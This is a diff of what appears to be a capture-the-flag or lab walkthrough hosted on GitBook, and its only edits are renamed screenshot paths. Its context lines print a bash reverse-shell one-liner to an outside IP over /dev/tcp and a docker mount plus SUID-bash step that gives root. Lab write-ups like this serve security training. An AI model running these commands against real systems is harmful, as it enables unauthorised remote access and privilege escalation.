@@ -52,7 +52,7 @@ It also finds another subdomain at `prod99`.&#x20;
 
 The `prod99` domain shows us this marriage website:
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 I created an account on the website and found that it runs on PHP. I checked around for exploits for 'matrim':
 
@@ -111,7 +111,7 @@ From here, we can easily get a reverse shell:
 $ bash -c 'bash -i >& /dev/tcp/192.168.45.189/21 0>&1'
 ```
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -160,6 +160,6 @@ We can mount back onto the first image:
 
 To get a `root` shell, simply run `chmod u+s /mnt/bin/bash`. Exit the docker container back onto the host machine and run `bash -p`:
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
